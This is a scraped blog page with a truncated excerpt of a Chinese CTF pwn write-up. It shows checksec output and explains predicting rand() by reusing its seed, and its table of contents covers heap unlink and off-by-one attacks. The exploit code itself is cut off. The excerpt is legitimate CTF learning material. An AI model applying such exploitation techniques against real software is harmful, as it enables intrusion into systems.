class="info-item-1">0x00 前言：kap0k 23级的第二场获奖的团队赛，最终只贡献了2道PWN，还是靠RE队友带飞了。最后一题堆题的复现拖了很久，总体来说不是什么难题，从这题开始稍微了解了一些unsorted bin的机制和off by one的攻击原理。做出来的两题都是比较简单的，所以可能写得有点粗糙，但最后一题堆题绝对写的很详细！ 0x01 题解部分：BoFido-ucscchecksec一下： Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)SHSTK:      EnabledIBT:        EnabledStripped:   No Ida就是一个简单的猜随机数。该随机数的生成依赖于种子，也就是说，如果种子一样，生成的随机数序列就一样。使用srand()函数来设定与题目相同的随机数种子，即可做到猜测随机数的效果 from pwn import *from ctypes...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/icon.jpg" onerror="this.onerror=null;this.src='/img/icon.jpg'" alt="avatar"/></div><div class="author-info-name">L1nk</div><div class="author-info-description">hi, I am Li1nk</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Li1nk3"><i class="/img/icon.jpg"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">0x01 分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5%E4%B8%BA%E6%98%AFunosrted-bin-attack"><span class="toc-number">2.1.</span> <span class="toc-text">以为是unosrted bin attack?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E5%AE%9E%E5%AD%A6unlink%E5%90%A7"><span class="toc-number">2.2.</span> <span class="toc-text">老实学unlink吧^^</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E6%A3%80%E6%B5%8B-%E7%BB%95%E4%B8%80%E4%B8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">还有检测?绕一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXPEXP"><span class="toc-number">2.4.</span> <span class="toc-text">EXPEXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X02-EXP"><span class="toc-number">3.</span> <span class="toc-text">0X02 EXP:</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By L1nk</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
